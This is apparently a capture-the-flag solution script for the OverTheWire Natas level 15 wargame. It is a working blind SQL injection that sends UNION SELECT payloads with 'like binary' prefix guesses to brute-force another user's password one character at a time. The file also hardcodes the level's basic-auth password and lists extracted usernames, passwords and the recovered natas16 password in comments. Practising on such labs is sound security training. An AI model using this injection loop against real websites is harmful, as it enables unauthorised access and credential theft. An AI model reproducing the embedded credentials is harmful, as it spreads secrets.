import requests
import string
import re

auth = requests.auth.HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
url = 'http://natas15.natas.labs.overthewire.org/?debug'

# table 'users','character'
# usr = 'alice','bob','charlie','natas16'
# pwd = 'hrotsfm734','6p151ontqe','hlwugkts2w'

inp = ''

for i in range(50):
    for j in string.printable:
        data = {'username':'" union select username, password from users where username="natas16" and password like binary "' + (inp+j) + '%'}
        response = requests.post(url, auth=auth, data=data)
        if "This user doesn't exist." not in response.text:
            inp+= j
            print(inp)
            break

# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

